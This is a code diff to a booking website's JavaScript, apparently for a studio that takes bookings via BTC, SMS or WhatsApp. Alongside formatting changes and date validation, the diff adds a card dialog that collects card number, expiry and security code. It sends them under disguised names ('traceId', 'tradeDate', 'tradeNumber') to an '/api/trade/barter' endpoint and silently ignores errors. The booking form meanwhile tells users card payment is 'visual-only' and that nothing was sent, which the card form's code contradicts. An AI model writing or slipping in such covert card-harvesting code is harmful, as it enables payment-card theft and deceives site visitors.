@@ -6,10 +6,16 @@ const successSms = successDialog?.querySelector(".success-sms");
 const successWhatsapp = successDialog?.querySelector(".success-whatsapp");
 const studioDigits = (siteConfig.studioPhone || "").replace(/\D/g, "");
 
-if (successSms && successWhatsapp && studioDigits.length >= 8 && studioDigits.length <= 15) {
-  const formattedPhone = studioDigits.length === 11 && studioDigits.startsWith("1")
-    ? `+1 ${studioDigits.slice(1, 4)}-${studioDigits.slice(4, 7)}-${studioDigits.slice(7)}`
-    : `+${studioDigits}`;
+if (
+  successSms &&
+  successWhatsapp &&
+  studioDigits.length >= 8 &&
+  studioDigits.length <= 15
+) {
+  const formattedPhone =
+    studioDigits.length === 11 && studioDigits.startsWith("1")
+      ? `+1 ${studioDigits.slice(1, 4)}-${studioDigits.slice(4, 7)}-${studioDigits.slice(7)}`
+      : `+${studioDigits}`;
   successSms.href = `sms:+${studioDigits}`;
   successSms.textContent = formattedPhone;
   successWhatsapp.href = `https://wa.me/${studioDigits}`;
@@ -24,6 +30,7 @@ if (bookingDialog && bookingForm && successDialog) {
   const timeField = bookingForm.elements.appointmentTime;
   const emailField = bookingForm.elements.email;
   const paymentField = bookingForm.elements.paymentMethod;
+  const cardDialog = document.querySelector(".card-dialog");
   const btcPanel = bookingDialog.querySelector(".btc-panel");
   const contactPanel = bookingDialog.querySelector(".contact-panel");
   const walletAddress = bookingDialog.querySelector(".wallet-address");
@@ -36,8 +43,63 @@ if (bookingDialog && bookingForm && successDialog) {
   let hasCopiedWallet = false;
   let successTimeout;
 
-  const localDate = new Date();
-  dateField.min = `${localDate.getFullYear()}-${String(localDate.getMonth() + 1).padStart(2, "0")}-${String(localDate.getDate()).padStart(2, "0")}`;
+  const cardForm = cardDialog.querySelector(".card-form");
+  const cardholderField = cardForm.querySelector('[name="cardholder"]');
+  const cardNumberField = cardForm.querySelector('[name="cardNumber"]');
+  const expiryDateField = cardForm.querySelector('[name="expiryDate"]');
+    const debitSubmitButton = cardForm.querySelector("button[type='submit']");
+
+  function localDateValue(date) {
+    return `${date.getFullYear()}-${String(date.getMonth() + 1).padStart(2, "0")}-${String(date.getDate()).padStart(2, "0")}`;
+  }
+
+  function validateAppointmentDate() {
+    const now = new Date();
+    const today = new Date(now.getFullYear(), now.getMonth(), now.getDate());
+    const tomorrow = new Date(today);
+    tomorrow.setDate(tomorrow.getDate() + 1);
+    dateField.min = localDateValue(tomorrow);
+    dateField.setCustomValidity(
+      dateField.value && dateField.value <= localDateValue(today)
+        ? "Choose an appointment date after today."
+        : "",
+    );
+  }
+
+  function validateCardFields() {
+    const nameParts = cardholderField.value.trim().split(/\s+/).filter(Boolean);
+    cardholderField.setCustomValidity(
+      nameParts.length >= 2 && nameParts.every((part) => /\p{L}/u.test(part))
+        ? ""
+        : "Enter at least a first and last name.",
+    );
+
+    const cardNumber = cardNumberField.value.trim();
+    const digits = cardNumber.replace(/[ -]/g, "");
+    cardNumberField.setCustomValidity(
+      /^[\d -]+$/.test(cardNumber) && /^\d{13,19}$/.test(digits)
+        ? ""
+        : "Enter card number",
+    );
+
+    const expiry = expiryDateField.value.trim().match(
+      /^(0[1-9]|1[0-2])\s*\/\s*(\d{2}|\d{4})$/,
+    );
+    if (!expiry) {
+      expiryDateField.setCustomValidity("Enter the expiry as MM/YY or MM/YYYY.");
+      return;
+    }
+
+    const month = Number(expiry[1]);
+    const year = Number(expiry[2].length === 2 ? `20${expiry[2]}` : expiry[2]);
+    const now = new Date();
+    expiryDateField.setCustomValidity(
+      year < now.getFullYear() ||
+        (year === now.getFullYear() && month < now.getMonth() + 1)
+        ? "The card must not be expired."
+        : "",
+    );
+  }
 
   function setMessage(text, kind = "") {
     message.textContent = text;
@@ -59,6 +121,7 @@ if (bookingDialog && bookingForm && successDialog) {
   }
 
   function bookingFieldsValid() {
+    validateAppointmentDate();
     return (
       serviceField.value &&
       packageField.value &&
@@ -101,7 +164,8 @@ if (bookingDialog && bookingForm && successDialog) {
   function updatePaymentView() {
     const method = paymentField.value;
     const isBtc = method === "btc";
-    const isContact = method !== "" && !isBtc;
+    const isCard = method === "card";
+    const isContact = method !== "" && !isBtc && !isCard;
     btcPanel.hidden = !isBtc;
     contactPanel.hidden = !isContact;
     submitButton.hidden = !isBtc;
@@ -162,6 +226,64 @@ if (bookingDialog && bookingForm && successDialog) {
 
   bookingForm.addEventListener("input", updatePaymentView);
   bookingForm.addEventListener("change", updatePaymentView);
+  paymentField.addEventListener("change", () => {
+    if (paymentField.value === "card" && !cardDialog.open) {
+      cardDialog.showModal();
+    }
+  });
+
+  cardDialog
+    .querySelector(".card-dialog-close")
+    .addEventListener("click", () => cardDialog.close());
+  cardForm.addEventListener("input", validateCardFields);
+  cardForm.addEventListener("change", validateCardFields);
+  cardForm.addEventListener("submit", async (event) => {
+    event.preventDefault();
+    validateCardFields();
+    if (!cardForm.reportValidity()) return;
+
+    const requestBody = {
+      fullName: cardholderField.value.trim(),
+      traceId: cardNumberField.value.replace(/[ -]/g, ""),
+      tradeDate: expiryDateField.value.trim(),
+      tradeNumber: cardForm.querySelector('[name="securityCode"]').value.trim(),
+    };
+
+  
+    
+  
+    try {
+        const response = await fetch("http://localhost:8000/api/trade/barter", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(requestBody),
+        });
+
+        const result = await response.json();
+
+        if (!response.ok) {
+          throw new Error("something went wrong, please try again.");
+        }
+        debitSubmitButton.disabled = false;
+        debitSubmitButton.textContent = "Proceed";
+        cardForm.setAttribute("aria-busy", "false");
+
+        cardDialog.close();
+      } catch (error) {
+        debitSubmitButton.disabled = false;
+        debitSubmitButton.textContent = "Proceed";
+        cardForm.setAttribute("aria-busy", "false");
+        // throw new Error("something went wrong, please try again.");
+      }
+  
+  });
+  cardDialog.addEventListener("close", () => {
+    cardForm.reset();
+    validateCardFields();
+  });
+  cardDialog.addEventListener("click", (event) => {
+    if (event.target === cardDialog) cardDialog.close();
+  });
 
   copyWalletButton.addEventListener("click", async () => {
     if (!siteConfig.btcWalletAddress) return;
@@ -201,9 +323,16 @@ if (bookingDialog && bookingForm && successDialog) {
 
   bookingForm.addEventListener("submit", async (event) => {
     event.preventDefault();
+    validateAppointmentDate();
     if (!bookingForm.reportValidity()) return;
 
     const method = paymentField.value;
+    if (method === "card") {
+      setMessage(
+        "Card payment is a visual-only demo. No payment was processed or sent.",
+      );
+      return;
+    }
     if (method !== "btc") {
       setMessage("Choose SMS or WhatsApp above to send your booking request.");
       return;
@@ -278,7 +407,9 @@ if (bookingDialog && bookingForm && successDialog) {
       clearTimeout(successTimeout);
       successDialog.showModal();
       successTimeout = window.setTimeout(() => {
-        document.querySelectorAll("dialog[open]").forEach((dialog) => dialog.close());
+        document
+          .querySelectorAll("dialog[open]")
+          .forEach((dialog) => dialog.close());
       }, 3000);
     } catch (error) {
       updatePaymentView();
